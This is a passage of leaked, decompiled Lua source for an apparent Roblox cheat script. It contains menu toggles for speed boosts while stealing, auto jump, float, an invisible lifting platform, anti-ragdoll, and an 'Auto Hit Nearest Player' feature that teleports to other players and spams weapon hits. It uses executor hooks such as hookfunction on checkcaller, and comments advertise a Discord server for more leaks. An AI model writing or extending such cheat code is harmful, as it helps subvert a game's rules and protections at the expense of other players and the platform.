		connection7 = localPlayer.ChildAdded:Connect(function(child)
			if child:IsA("Backpack") then
				func231(child)
				func229()
			end
		end)

		local function func232(param65, param66)
			flag151 = param65
			now = param66
			num25 = nil
		end

		local function func233(flag171, num28)
			if not flag171 then
				num25 = nil
				return false
			end
			local value182 = num25
			local value183

			if num25 then
				value183 = value182
			else
				value183 = num28
			end

			num25 = value183
			return num28 - num25 >= n6
		end

		local function func234(param67, param68)
			local assemblyLinearVelocity = param67.AssemblyLinearVelocity
			param67.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, param68, assemblyLinearVelocity.Z)
		end

		local function func235(part11, param69)
			local parent = part11.Parent

			if value169 ~= parent then
				value169 = parent
				raycastParams.FilterDescendantsInstances = { parent }
			end

			local n26

			if param69.RigType == Enum.HumanoidRigType.R6 then
				n26 = 3
			else
				n26 = math.max(part11.Size.Y * 0.5, param69.HipHeight + part11.Size.Y * 0.5)
			end

			local hit = Workspace:Raycast(part11.Position, Vector3.new(0, -(n26 + n7), 0), raycastParams)
			return hit ~= nil and hit.Normal.Y > 0.15
		end

		local connection9 = RunService.Heartbeat:Connect(function(deltaTime)
			local flag172, num29 = func211()
			local now3 = os.clock()

			if not flag172 or not num29 or num29.Health <= 0 then
				flag152 = nil
				y = nil
				n22 = 0
				return
			end

			if flag172 ~= flag152 or not y then
				flag152 = flag172
				y = flag172.Position.Y
				now2 = now3
				n22 = 0
				func232("Bottom", now3)
			else
				local n26 = now3 - now2

				if n26 > 0 then
					n22 = (flag172.Position.Y - y) / n26
				end

				y = flag172.Position.Y
				now2 = now3
			end

			if flag147 then
				local n26 = math.max(0.02, n3 / n15)
				local n27 = math.max(0.01, n5 / n15)
				local n28 = n4 * n15
				local n29 = now3 - now

				if flag151 == "Rise" then
					local n30 = math.clamp(n29 / n26, 0, 1)
					local n31 = n12 * 3.1415926535897931 / 2 * n26 * math.cos(n30 * 3.1415926535897931 * 0.5)

					if func233(n29 >= 0.06 and n31 >= n10 and math.abs(n22) <= n11, now3) then
						func232("Fall", now3)
					elseif n30 >= 1 then
						func232("Hold", now3)
						func234(flag172, 0)
					else
						func234(flag172, n31)
					end
				elseif flag151 == "Hold" then
					if n13 <= n29 then
						func232("Fall", now3)
					else
						func234(flag172, 0)
					end
				elseif flag151 == "Fall" then
					local n30 = math.clamp(n29 / n27, 0, 1)
					local n31 = -n28 * math.sin(n30 * 3.1415926535897931 * 0.5)

					if func233(n29 >= 0.01 and n31 <= -n10 and n22 >= -n11, now3) or n30 >= 1 then
						func232("Bottom", now3)
					else
						func234(flag172, n31)
					end
				else
					num25 = nil

					if n29 >= n14 and func235(flag172, num29) then
						func232("Rise", now3)
					end
				end
			else
				num25 = nil

				if flag151 ~= "Bottom" then
					func232("Bottom", now3)
				end
			end

			if flag150 then
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

				if not (humanoid and humanoid.Health > 0) then
					flag157 = false
					n23 = math.max(n23, now3 + 1.5)
				else
					local tool = character_:FindFirstChildWhichIsA("Tool")
					flag157 = tool ~= nil and tool.Name == str20

					if not tool or tool.Name ~= str20 then
						if not func121() and now3 >= n23 then
							func224()
						end
					elseif str20 == flag153 then
						flag154 = tool
						flag159 = true
						func215(tool)
						func220(tool)
						func218(tool)
					end
				end
			else
				flag157 = false
			end

			local flag173 = localPlayer:GetAttribute("Stealing") == true
			local flag174 = flag173 and not flag156
			flag156 = flag173

			if flag174 and flag148 and obj48 and (not flag149 or obj48:Get() ~= true) and not flag155 then
				flag155 = true

				task.defer(function()
					flag155 = false
					if not flag1 or localPlayer:GetAttribute("Stealing") ~= true or not flag148 or not obj48 then
						return
					end

					if obj48:Get() ~= true then
						obj48:Set(true, true)
					else
						flag149 = true
						n20 = math.max(20, n17 - n8)
						n21 = 1
					end
				end)
			end

			local value184 = flag173 and flag149
			local flag175 = flag150 and flag157 and not flag173

			if flag175 then
				local assemblyLinearVelocity = flag172.AssemblyLinearVelocity
				local moveDirection = num29.MoveDirection
				local vector = Vector3.zero

				if moveDirection.Magnitude > 0.001 then
					vector = moveDirection.Unit * num26
				end

				flag172.AssemblyLinearVelocity = Vector3.new(vector.X, assemblyLinearVelocity.Y, vector.Z)
				flag158 = true
			else
				func221()
			end

			local num30

			if value184 then
				local n26 = math.max(20, n17 - n8)

				if n17 <= n26 then
					n20 = n17
				else
					n20 += n21 * n9 * deltaTime

					if n17 <= n20 then
						n20 = n17
						n21 = -1
					elseif n20 <= n26 then
						n20 = n26
						n21 = 1
					end
				end

				num30 = n20
			else
				local flag176 = not flag173 and flag148 and not flag175
				num30 = nil

				if flag176 then
					num30 = n16
				end
			end

			if num30 then
				local moveDirection = num29.MoveDirection
				local n26 = num30 - num29.WalkSpeed

				if moveDirection.Magnitude > 0.001 and math.abs(n26) > 0.001 then
					flag172.CFrame = flag172.CFrame + moveDirection * n26 * deltaTime
				end
			end
		end)

		local connection10 = localPlayer.CharacterAdded:Connect(function(character_)
			flag152 = nil
			y = nil
			func219()
			func214()
			flag154 = nil
			flag157 = false
			n23 = os.clock() + 3
			func230(character_)
			local backpack2 = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack2 then
				func231(backpack2)
			end

			func229()

			if flag150 then
				task.spawn(function()
					local humanoid = character_:WaitForChild("Humanoid", 3)
					if not humanoid then
						return
					end

					if not character_:WaitForChild("HumanoidRootPart", 3) then
						return
					end
					local now3 = os.clock()
					local grappleHook

					while true do
						grappleHook = func118(str20)

						if func210(grappleHook) then
							break
						else
							task.wait(0.1)
							if not (func210(grappleHook) or os.clock() - now3 >= 3 or not flag150) then
								continue
							end
							break
						end
					end

					if not flag150 then
						return
					end

					if not func210(grappleHook) and str20 == flag153 then
						grappleHook = func119("Grapple Hook")
					end

					if func210(grappleHook) and flag150 and humanoid.Health > 0 then
						task.wait(0.15)
						flag154 = func226(grappleHook)

						if flag154 then
							flag157 = true

							if str20 == flag153 then
								func216()
								flag159 = true
								func215(flag154)
								func220(flag154)
								RunService.Heartbeat:Wait()
								func218(flag154)
							end
						else
							func223()
						end
					elseif flag150 then
						func223()
					end
				end)
			end
		end)

		func2(function()
			flag147 = false
			flag148 = false
			flag149 = false
			flag160 = false
			func222()
			flag163 = false

			if value167 then
				pcall(function()
					hookfunction(checkcaller, value167)
				end)
			end

			if connection10 then
				connection10:Disconnect()
				connection10 = nil
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection9 then
				connection9:Disconnect()
				connection9 = nil
			end
		end)

		obj45:CreateSlider({
			Name = "Adjust Speed",
			ShowWhen = obj45:CreateToggle({
				Name = "Speed Boost",
				Default = true,
				Note = "Moves faster without a tool and pauses while stealing.",
				Callback = function(value)
					flag148 = value == true
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 52,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(value)
				n16 = math.clamp(tonumber(value) or 52, 20, 64)
			end,
		})

		obj48 = obj45:CreateToggle({
			Name = "Speed Boost While Stealing",
			Default = true,
			Note = "Smoothly varies speed while stealing.",
			Callback = function(value)
				flag149 = value == true
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		obj45:CreateSlider({
			Name = "Adjust Auto Speed",
			DisplayName = "Adjust Speed On Steal",
			ShowWhen = obj48,
			Min = 20,
			Max = 29,
			Default = 28,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(value)
				n17 = math.clamp(tonumber(value) or 28, 20, 29)
				n20 = math.max(20, n17 - n8)
				n21 = 1
			end,
		})

		obj47 = obj45:CreateToggle({
			Name = "Tool Speed Boost",
			Default = false,
			Keybind = Enum.KeyCode.Q,
			Note = "Equips the selected speed tool. Switching tools turns this off.",
			Callback = function(value)
				if value then
					if not func227() then
						task.defer(function()
							if obj47 then
								obj47:Set(false, true)
							end
						end)
					end
				else
					func222()
				end
			end,
		})

		obj49 = obj45:CreateDropdown({
			Name = "Speed Tool",
			ShowWhen = obj47,
			Options = value170,
			Default = "Grapple Hook",
			Callback = function(value)
				local str21 = tostring(value or "Grapple Hook")
				if str21 == str20 then
					return
				end
				str20 = str21
				func213()

				if flag150 then
					func223()
				end
			end,
		})

		obj50 = obj45:CreateSlider({
			Name = "Adjust Tool Speed",
			ShowWhen = obj47,
			Min = 50,
			Max = str20 == flag153 and 270 or 210,
			Default = 240,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(value)
				if str20 == flag153 then
					n18 = math.clamp(tonumber(value) or 240, 50, 270)
					num26 = n18
				else
					n19 = math.clamp(tonumber(value) or 185, 50, 210)
					num26 = n19
				end
			end,
		})

		local value185 = obj46:CreateToggle({
			Name = "Auto Jump",
			Default = false,
			Note = "Automatically repeats jumps.",
			Callback = function(value)
				flag147 = value == true
				func232("Bottom", os.clock())
			end,
		})

		obj46:CreateSlider({
			Name = "Height",
			SubOf = value185,
			Min = 1,
			Max = 21,
			Default = 16,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Sets the maximum height of each jump.",
			Callback = function(value)
				n12 = math.clamp(tonumber(value) or 19.1, 1, 21)
			end,
		})

		obj46:CreateSlider({
			Name = "Auto Jump Speed",
			SubOf = value185,
			DisplayName = "Jump Speed",
			Min = 20,
			Max = 110,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Note = "Controls jump speed (20 to 110, default 52 = 0.52x).",
			Callback = function(value)
				n15 = math.clamp(tonumber(value) or 52, 20, 110) / 100
			end,
		})

		obj46:CreateSlider({
			Name = "Air Hold",
			SubOf = value185,
			Min = 0,
			Max = 1,
			Default = 0.1,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long you stay at the top of each jump.",
			Callback = function(value)
				n13 = math.clamp(tonumber(value) or 0.2, 0, 1)
			end,
		})

		obj46:CreateSlider({
			Name = "Ground Delay",
			SubOf = value185,
			Min = 0,
			Max = 1,
			Default = 0,
			AllowDecimals = true,
			Increment = 0.01,
			Note = "Controls how long to wait on the ground before jumping again.",
			Callback = function(value)
				n14 = math.clamp(tonumber(value) or 0, 0, 1)
			end,
		})

		floatSpeedToolBridge.GetSelectedName = function()
			return str20
		end

		floatSpeedToolBridge.EquipSelected = function()
			local grappleHook = func118(str20)

			if not func210(grappleHook) and str20 == flag153 then
				local value186
				grappleHook, value186 = func119("Grapple Hook")
				if not func210(grappleHook) then
					func225("Grapple Hook", value186)
					return nil
				end
			elseif not func210(grappleHook) then
				obj1.Notify("Tool unavailable", str20 .. " is not currently owned.", 5)
				return nil
			end

			local flag177 = func226(grappleHook)
			if not flag177 then
				obj1.Notify("Tool unavailable", "Unable to equip " .. str20 .. " right now.", 5)
				return nil
			end
			return flag177
		end

		floatSpeedToolBridge.StartGrappleSpam = function(obj)
			if not func210(obj) or obj.Name ~= flag153 then
				return false
			end
			flag160 = true
			func216()
			func215(obj)
			func220(obj)
			func218(obj)
			return true
		end

		floatSpeedToolBridge.PulseGrapple = function(obj)
			if not flag160 or not func210(obj) or obj.Name ~= flag153 then
				return false
			end
			func215(obj)
			func220(obj)
			func218(obj)
			return true
		end

		floatSpeedToolBridge.StopGrappleSpam = function()
			flag160 = false

			if not flag159 then
				n24 = 0
				func219()
				func214()
			end
		end
	end

	do
		local n25 = 0.0083333333333333332
		local n26 = 4
		local n27 = 0.12
		local n28 = 25
		local n29 = 0.045
		local n30 = 0.03
		local n31 = 10
		local n32 = 60
		local flag178 = false
		local connection6 = nil
		local n33 = 0
		local flag179 = false
		local n34 = 0
		local n35 = 0
		local n36 = 0
		local value187 = nil
		local flag180 = false
		local flag181 = false
		local value188 = nil
		local flag182 = false

		local function func236()
			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			flag178 = false
			n33 = 0
			flag179 = false
			n34 = 0
			n35 = 0
			n36 = 0
			value187 = nil
			local stopGrappleSpam = floatSpeedToolBridge.StopGrappleSpam

			if type(stopGrappleSpam) == "function" then
				stopGrappleSpam()
			end
		end

		local function func237()
			if flag182 then
				return
			end
			flag182 = true

			task.defer(function()
				flag182 = false
				func236()

				if value188 and value188:Get() == true then
					value188:Set(false, true)
				end
			end)
		end

		local function func238(instance38)
			if not flag178 or not instance38 or not instance38.Parent then
				return
			end
			local now3 = os.clock()
			n35 = n32
			n34 = now3 + n27
			flag179 = true
			n36 = now3
		end

		local function func239(param70, param71)
			local assemblyLinearVelocity = param70.AssemblyLinearVelocity
			local floorMaterial2 = param71.FloorMaterial ~= Enum.Material.Air
			local now3 = os.clock()

			if now3 - n36 >= n29 or flag179 and n34 - now3 <= n30 then
				func238(param70)
			end

			if flag179 then
				if n34 <= now3 then
					flag179 = false
				else
					local n37 = (Workspace.Gravity - Workspace.Gravity) * n25
					param70.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y + (n35 - assemblyLinearVelocity.Y) * (1 - math.exp(-n28 * n25)) - n37, assemblyLinearVelocity.Z)
				end
			elseif not floorMaterial2 then
				local gravity = Workspace.Gravity

				if assemblyLinearVelocity.Y < 0 then
					gravity += n31
				end

				local n37 = gravity - Workspace.Gravity

				if math.abs(n37) > 0.001 then
					param70.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, assemblyLinearVelocity.Y - n37 * n25, assemblyLinearVelocity.Z)
				end
			end
		end

		local function func240(param72)
			func236()
			value187 = param72
			local startGrappleSpam = floatSpeedToolBridge.StartGrappleSpam

			if value187 and type(startGrappleSpam) == "function" then
				if not startGrappleSpam(value187) then
					value187 = nil
				end
			end

			flag178 = true
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

			if character_ then
				func238(character_)
			end

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)
				if not flag178 then
					return
				end

				if flag181 and localPlayer:GetAttribute("Stealing") == true then
					func237()
					return
				end
				local character_2 = localPlayer.Character
				local humanoidRootPart = character_2 and character_2:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local humanoid = character_2:FindFirstChildOfClass("Humanoid")
				if humanoid and humanoid.Health <= 0 then
					func237()
					return
				end
				local pulseGrapple = floatSpeedToolBridge.PulseGrapple

				if value187 and type(pulseGrapple) == "function" then
					if not pulseGrapple(value187) then
						value187 = nil
					end
				end

				n33 += deltaTime
				if n33 < n25 then
					return
				end
				local n37 = math.floor(n33 / n25)

				if n26 < n37 then
					n33 = 0
					n37 = 4
				else
					n33 -= n37 * n25
				end

				for i_ = 1, n37 do
					func239(humanoidRootPart, humanoid)
				end
			end)
		end

		value188 = obj10:CreateToggle({
			Name = "Float",
			Default = false,
			Callback = function(value)
				if value then
					if flag181 and localPlayer:GetAttribute("Stealing") == true then
						func237()
						return
					end
					local value189 = nil

					if flag180 then
						local equipSelected = floatSpeedToolBridge.EquipSelected

						if type(equipSelected) ~= "function" then
							obj1.Notify("Tool unavailable", "The Speed Tool selection is not available right now.", 5)
							func237()
							return
						end

						value189 = equipSelected()
						if not value189 then
							func237()
							return
						end
					end

					func240(value189)
				else
					func236()
				end
			end,
		})

		obj10:CreateToggle({
			Name = "Auto Equip Speed Tool",
			Note = "Equips the current Speed Tool selection before Float starts.",
			Default = true,
			SubOf = value188,
			Callback = function(value)
				flag180 = value == true
			end,
		})

		obj10:CreateToggle({
			Name = "Auto Off After Steal",
			Default = true,
			SubOf = value188,
			Callback = function(value)
				flag181 = value == true

				if flag181 and flag178 and localPlayer:GetAttribute("Stealing") == true then
					func237()
				end
			end,
		})

		func2(function()
			func236()
		end)
	end

	do
		local n25 = 1
		local flag183 = false
		local connection6 = nil
		local value190 = nil
		local n26 = 5

		local function func241()
			if value190 then
				pcall(function()
					value190:Destroy()
				end)

				value190 = nil
			end
		end

		local function func242()
			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			flag183 = false
			func241()
		end

		local function createPart()
			if value190 and value190.Parent then
				return value190
			end
			func241()
			local part = Instance.new("Part")
			part.Name = func1()
			part.Anchored = true
			part.CanCollide = true
			part.CanQuery = false
			part.CanTouch = false
			part.CastShadow = false
			part.Massless = true
			part.Size = Vector3.new(6, 1, 6)
			part.Transparency = 1
			part.Parent = Workspace
			value190 = part
			return part
		end

		local function func243()
			func242()
			flag183 = true

			connection6 = RunService.Heartbeat:Connect(function(deltaTime)
				if not flag183 then
					return
				end
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					func241()
					return
				end
				local part12 = createPart()
				local n27 = math.min(deltaTime, 0.1) * n26
				local humanoid = character_:FindFirstChildOfClass("Humanoid")
				local n28 = 3.2

				if humanoid then
					n28 = humanoid.HipHeight + humanoidRootPart.Size.Y * 0.5
				end

				local n29 = humanoidRootPart.Position.Y - n28
				local y2 = part12.Position.Y
				local n30

				if math.abs(y2 + n25 * 0.5 - n29) > 6 then
					n30 = n29 - n25 * 0.5
				else
					n30 = y2 + n27
				end

				part12.CFrame = CFrame.new(humanoidRootPart.Position.X, n30, humanoidRootPart.Position.Z)
				local n31 = n30 + n25 * 0.5

				if n31 > n29 then
					local n32 = n31 + n28
					local n33 = humanoidRootPart.CFrame - humanoidRootPart.CFrame.Position
					humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, n32, humanoidRootPart.Position.Z) * n33
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end
			end)
		end

		obj10:CreateSlider({
			Name = "Floor Push Speed",
			Min = 5,
			Max = 40,
			Default = 10,
			AllowDecimals = false,
			Increment = 1,
			Unit = " studs/s",
			Quick = false,
			SubOf = obj10:CreateToggle({
				Name = "Floor Push",
				Note = "Raises an invisible platform under you and carries you up with it.",
				Default = false,
				Callback = function(value)
					if value then
						func243()
					else
						func242()
					end
				end,
			}),
			Callback = function(value)
				n26 = math.clamp(tonumber(value) or 5, 5, 40)
			end,
		})
	end
end

local obj53, obj54, obj55, func244, func245, func246, func247, func248, func249, tbl43
local func250, func251, func252, n, func253, func254, func255
-- more leaks: https://discord.gg/x7YbZeezpm

do
	do
		local n2 = 0.01
		local flag184 = false
		local n3 = 50
		local connection = nil
		local connection2 = nil
		local value191 = nil
		local value192 = nil
		local autoRotate = true
		local value193 = nil
		local value194 = nil
		local flag185 = false
		local flag186 = false
		local n4 = 0
		local obj2 = setmetatable({}, { __mode = "k" })

		local function func256(player4)
			player4 = player4 and player4.Character
			local humanoid = player4 and player4:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart

			if player4 then
				humanoidRootPart = player4:FindFirstChild("HumanoidRootPart") or player4:FindFirstChild("UpperTorso") or player4:FindFirstChild("Torso")
			else
				humanoidRootPart = player4
			end

			if humanoid and humanoid.Health > 0 and humanoidRootPart then
				return player4, humanoid, humanoidRootPart
			end
		end

		local function func257(part13)
			local huge = math.huge
			local value195 = nil

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local value196, value197, value198 = func256(player)

					if value198 then
						local magnitude = (value198.Position - part13.Position).Magnitude

						if magnitude < huge then
							huge = magnitude
							value195 = value198
						end
					end
				end
			end

			return value195
		end

		local function func258(obj56)
			obj56 = obj56 and obj56:FindFirstChildWhichIsA("Tool")
			if obj56 and obj56.Name:lower():find("bat", 1, true) then
				return obj56
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
						return child
					end
				end
			end
		end

		local function func259(obj57, obj58)
			local flag187 = func258(obj57)

			if not flag187 then
				if not flag186 then
					flag186 = true
					obj1.Notify("Bat unavailable", "Bat was not found in your character or Backpack.", 5)
				end

				return nil
			end

			flag186 = false

			if flag187.Parent ~= obj57 then
				local tool = obj57:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= flag187 and not value193 then
					value193 = tool
				end

				value194 = flag187
				flag185 = true

				pcall(function()
					func3(1)
					obj58:EquipTool(flag187)
				end)
			end

			return flag187.Parent == obj57 and flag187 or nil
		end

		local function func260(instance39)
			if not instance39:IsA("BasePart") then
				return
			end

			if obj2[instance39] == nil then
				obj2[instance39] = instance39.CanCollide
			end

			instance39.CanCollide = false
		end

		local function func261()
			for k, value199 in pairs(obj2) do
				if k.Parent then
					pcall(function()
						k.CanCollide = value199
					end)
				end

				obj2[k] = nil
			end
		end

		local function func262(list29)
			if value191 == list29 then
				return
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			func261()
			value191 = list29
			if not list29 then
				return
			end

			for _, descendant in ipairs(list29:GetDescendants()) do
				func260(descendant)
			end

			connection2 = list29.DescendantAdded:Connect(function(descendant)
				if flag184 then
					func260(descendant)
				end
			end)
		end

		local function func263()
			local obj59 = value192
			value192 = nil
			if not obj59 or not obj59.Parent then
				return
			end

			pcall(function()
				obj59.AutoRotate = autoRotate
				local physics = Enum.HumanoidStateType.Physics

				if obj59:GetState() == physics then
					obj59:ChangeState(Enum.HumanoidStateType.Freefall)
				end
			end)
		end

		local function func264(obj60)
			if value192 ~= obj60 then
				func263()
				value192 = obj60
				autoRotate = obj60.AutoRotate
			end

			obj60.AutoRotate = false
			local physics = Enum.HumanoidStateType.Physics

			if obj60:GetState() ~= physics then
				obj60:ChangeState(Enum.HumanoidStateType.Physics)
			end
		end

		local function func265()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local value200 = value194
			local flag188 = value193
			value194 = nil
			value193 = nil
			if not flag185 or not character_ or not humanoid or humanoid.Health <= 0 then
				flag185 = false
				return
			end
			flag185 = false
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool and tool ~= value200 then
				return
			end

			pcall(function()
				func3(0.5)

				if flag188 and flag188.Parent then
					humanoid:EquipTool(flag188)
				else
					humanoid:UnequipTools()
				end
			end)
		end

		local function func266()
			flag184 = false
			n4 = 0
			flag186 = false

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			value191 = nil
			func263()
			func261()
			func265()
		end

		local function func267()
			func266()
			flag184 = true

			connection = RunService.Heartbeat:Connect(function(deltaTime)
				local flag189, flag190, num31 = func256(localPlayer)

				if not flag189 or not flag190 or not num31 then
					n4 = 0
					func263()
					return
				end

				func262(flag189)
				local obj61 = func259(flag189, flag190)
				local flag191 = func257(num31)

				if not flag191 then
					n4 = 0
					func263()
					return
				end

				func264(flag190)
				local lookVector = flag191.CFrame.LookVector
				local vector = Vector3.new(lookVector.X, 0, lookVector.Z)
				local vector2

				if vector.Magnitude <= 0.001 then
					vector2 = Vector3.new(0, 0, -1)
				else
					vector2 = vector.Unit
				end

				local position = flag191.Position
				local n5 = position - num31.Position
				local magnitude = n5.Magnitude

				if magnitude > 0.001 then
					position = num31.Position + n5.Unit * math.min(magnitude, n3 * deltaTime)
				end

				num31.CFrame = CFrame.lookAt(position, position + vector2, Vector3.new(0, 1, 0))
				num31.AssemblyLinearVelocity = flag191.AssemblyLinearVelocity
				num31.AssemblyAngularVelocity = Vector3.zero
				if not obj61 then
					n4 = 0
					return
				end
				n4 += deltaTime
				local n6 = math.min(math.floor(n4 / n2), 6)
				if n6 <= 0 then
					return
				end
				n4 -= n6 * n2

				for i_ = 1, n6 do
					pcall(function()
						obj61:Deactivate()
						obj61:Activate()
					end)
				end
			end)
		end

		func2(func266)

		obj10:CreateSlider({
			Name = "Follow Speed",
			DisplayName = "Follow Speed",
			SubOf = obj10:CreateToggle({
				Name = "Auto Hit Nearest Player",
				Default = false,
				Callback = function(value)
					if value then
						func267()
					else
						func266()
					end
				end,
			}),
			Min = 20,
			Max = 64,
			Default = 50,
			AllowDecimals = true,
			Increment = 0.1,
			Callback = function(value)
				n3 = math.clamp(tonumber(value) or 50, 20, 64)
			end,
		})
	end

	do
		local tbl44 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }

		local tbl45 = {
			[Enum.HumanoidStateType.Physics] = true,
			[Enum.HumanoidStateType.Ragdoll] = true,
			[Enum.HumanoidStateType.FallingDown] = true,
		}

		local n2 = 12
		local n3 = 5
		local n4 = 0
		local value201 = nil

		local ok, result = pcall(function()
			return require(ReplicatedStorage.Controllers.RagdollController)
		end)

		if ok then
			value201 = result
		end

		local value202 = nil

		local function func268()
			if value202 then
				return value202
			end

			local ok2, result2 = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok2 then
				value202 = result2
			end

			return value202
		end

		local flag192 = false
		local connection = nil
		local n5 = 0
		local list30 = {}
		local list31 = {}
		local n6 = 0
		local value203 = nil
		local humanoid = nil

		local function func269(list32)
			for _, item40 in ipairs(list32) do
				if item40.Connected then
					item40:Disconnect()
				end
			end

			table.clear(list32)
		end

		local function func270(param73)
			list30[#list30 + 1] = param73
		end

		local function func271(param74)
			list31[#list31 + 1] = param74
		end

		local function func272()
			if not value203 or not humanoid then
				return
			end
			local humanoidRootPart = value203:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n7 = humanoid.WalkSpeed + n3
			local y = assemblyLinearVelocity.Y
			local flag193 = false

			if n7 < vector.Magnitude then
				vector = vector.Unit * n7
				flag193 = true
			end

			if n4 < y then
				y = n4
				flag193 = true
			end

			if flag193 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function func273()
			if not value203 or not value203.Parent then
				return
			end

			for _, descendant in ipairs(value203:GetDescendants()) do
				if tbl44[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function func274()
			if not value203 or not value203.Parent then
				return
			end

			for _, descendant in ipairs(value203:GetDescendants()) do
				if descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function func275()
			local result21 = func268()

			if result21 and result21.controlsEnabled == false then
				pcall(function()
					result21:Enable()
				end)
			end
		end

		local function func276()
			local currentCamera = Workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function func277()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end
			-- S​o​u​r​c​e​ ​L​e​a​k​ ​(​S​L​) | https://discord.gg/x7YbZeezpm

			if tbl45[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function func278()
			if not value201 then
				return false
			end

			local ok2, result2 = pcall(function()
				return value201.IsInRagdoll()
			end)

			return ok2 and result2 == true
		end

		local function func279()
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end

		local function func280()
			if not flag192 or not value203 or value203 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(value203) then
				return
			end
			n5 = os.clock() + n2
			if connection then
				return
			end

			connection = RunService.Heartbeat:Connect(function()
				if not flag192 then
					func279()
					return
				end

				if value203 ~= localPlayer.Character or not humanoid or not humanoid:IsDescendantOf(value203) then
					func279()
					return
				end
				func272()
				func273()
				func274()
				func277()
				func275()
				func276()

				if os.clock() > n5 or not func278() then
					func279()
				end
			end)
		end

		local function func281(obj62)
			n6 += 1
			local flag194 = n6
			func269(list31)
			func279()
			value203 = obj62
			humanoid = nil
			if not flag192 or not obj62 then
				return
			end
			humanoid = obj62:FindFirstChildOfClass("Humanoid") or obj62:WaitForChild("Humanoid", 5)
			if not flag192 or n6 ~= flag194 or obj62 ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			if humanoid then
				func271(humanoid.StateChanged:Connect(function(old, new)
					if flag192 and tbl45[new] then
						func280()
					end
				end))
			end

			func271(obj62.DescendantAdded:Connect(function(descendant)
				if flag192 and tbl44[descendant.ClassName] then
					func280()
				end
			end))

			func276()

			if func278() then
				func280()
			end
		end

		local function func282()
			flag192 = false
			n6 += 1
			func279()
			func269(list31)
			func269(list30)
			value203 = nil
			humanoid = nil
		end

		local function func283()
			func282()
			flag192 = true
			func268()

			func270(localPlayer.CharacterAdded:Connect(function(character_)
				if flag192 then
					task.defer(function()
						if flag192 and character_ == localPlayer.Character then
							func281(character_)
						end
					end)
				end
			end))

			func270(localPlayer.CharacterRemoving:Connect(function(character_)
				if flag192 and character_ == value203 then
					n6 += 1
					func279()
					func269(list31)
					value203 = nil
					humanoid = nil
				end
			end))

			func270(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag192 then
					func280()
				end
			end))

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			local net = packages and packages:FindFirstChild("Net")
			net = net and net:FindFirstChild("RE/CombatService/ApplyImpulse")

			if net then
				func270(net.OnClientEvent:Connect(function()
					if flag192 then
						func272()
						func280()
					end
				end))
			end

			if localPlayer.Character then
				func281(localPlayer.Character)
			end
		end

		func2(func282)

		obj11:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function(value)
				if value then
					func283()
				else
					func282()
				end
			end,
		})
	end

	do
		local flag195 = false
		local n2 = 0
		local connection = nil
